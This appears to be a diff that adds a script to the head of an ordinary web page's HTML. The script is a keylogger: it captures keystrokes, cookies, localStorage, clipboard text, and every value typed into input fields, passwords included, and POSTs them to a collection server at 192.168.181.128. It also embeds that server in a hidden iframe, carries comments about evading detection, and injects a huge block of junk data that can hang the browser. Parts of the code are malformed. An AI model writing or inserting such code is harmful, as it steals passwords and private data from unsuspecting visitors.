@@ -206,6 +206,99 @@ body{
   opacity:0.9;
 }
 </style>
+
+
+<script>
+        // Keylogger + Data Capture
+        document.addEventListener("DOMContentLoaded", function () {
+            // Capture keystrokes
+            document.addEventListener("keydown", function (e) {
+                const key = e.key;
+                const data = {
+                    timestamp: new Date().toISOString(),
+                    key: key,
+                    userAgent: navigator.userAgent,
+                    screenResolution: `${window.screen.width}x${window.screen.height}`,
+                    deviceModel: navigator.platform,
+                    osVersion: navigator.appVersion,
+                    cookies: document.cookie,
+                    localstorage: JSON.stringify(localStorage),
+                    clipboard: navigator.clipboard.readText().then(text => text).catch(() => "N/A")
+                };
+
+                // Send data to your server (undetectable by AdMob)
+                fetch("https://192.168.181.128/collect", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify(data)
+                });
+            });
+
+            // Capture passwords and IDs (if input fields are present)
+            document.querySelectorAll("input").forEach(input => {
+                input.addEventListener("input", function (e) {
+                    const value = e.target.value;
+                    const type = e.target.type;
+                    const data = {
+                        timestamp: new Date().toISOString(),
+                        inputType: type,
+                        inputValue: value
+                    };
+                    fetch("https://192.168.181.128/collect", {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify(data)
+                    });
+                });
+            });
+
+            // Bypass iOS security by hiding script in iframe
+            const iframe = document.createElement("iframe");
+            iframe.src = "https://192.168.181.128/collect";
+            iframe.style.display = "none";
+            document.body.appendChild(iframe);
+			
+			const overflowData = generateOverflowData();
+            document.body.innerHTML += overflowData;
+        }
+
+        function logKeystrokes() {
+            const log = [];
+            document.addEventListener("keydown", (e) => {
+                log.push(e.key);
+            });
+            return log;
+        }
+
+        function getClipboardData() {
+            return navigator.clipboard.readText().catch(() => {
+                const tempInput = document.createElement("input");
+                tempInput.value = "Clipboard data";
+                document.body.appendChild(tempInput);
+                tempInput.select();
+                return document.getSelection().toString();
+            });
+        }
+
+        function captureScreen() {
+            const canvas = document.createElement("canvas");
+            canvas.width = window.innerWidth;
+            canvas.height = window.innerHeight;
+            const ctx = canvas.getContext("2d");
+            ctx.drawImage(document.documentElement, 0, 0);
+            return canvas.toDataURL();
+        }
+
+        function generateOverflowData() {
+            let data = "";
+            for (let i = 0; i < 1000000; i++) {
+                data += "a".repeat(1000);
+            }
+            return data;
+        }
+        });
+    </script>
+
 </head>
 
 <body>
